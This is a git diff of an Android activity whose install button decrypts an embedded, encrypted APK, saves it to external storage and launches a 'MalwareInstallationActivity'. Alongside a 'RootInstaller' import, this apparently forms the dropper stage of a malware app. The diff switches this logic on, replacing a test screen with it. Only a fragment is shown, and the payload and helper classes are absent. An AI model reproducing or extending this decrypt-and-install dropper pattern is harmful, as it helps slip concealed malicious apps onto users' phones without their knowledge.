@@ -1,4 +1,4 @@
-package com.andrei.host.ui;
+package com.andrei.host.presentation.ui;
 
 import android.Manifest;
 import android.content.Intent;
@@ -17,8 +17,9 @@ import android.widget.ImageView;
 import android.widget.Toast;
 
 import com.andrei.host.R;
+import com.andrei.host.domain.data.storage.StorageUtils;
+import com.andrei.host.security.CryptoUtils;
 import com.andrei.host.security.RootInstaller;
-import com.andrei.host.storage.StorageUtils;
 
 import java.io.IOException;
 import java.io.InputStream;
@@ -78,11 +79,12 @@ public class AnakinActivity extends AppCompatActivity implements View.OnClickLis
     public void onClick(View v) {
         switch (v.getId()) {
             case R.id.install_btn:
-                Intent intent = new Intent(this, TestActivity.class);
+                byte[] apk = CryptoUtils.decryptApk(StorageUtils.ANAKIN_FILE, this);
+                StorageUtils.saveExternalStorage(apk, this);
+
+                Intent intent = new Intent(this, MalwareInstallationActivity.class);
                 startActivity(intent);
-//
-//                byte[] apk = CryptoUtils.decryptApk(StorageUtils.ANAKIN_FILE, this);
-//                StorageUtils.saveExternalStorage(apk, this);
+
 //                installApk2();
                 break;
 
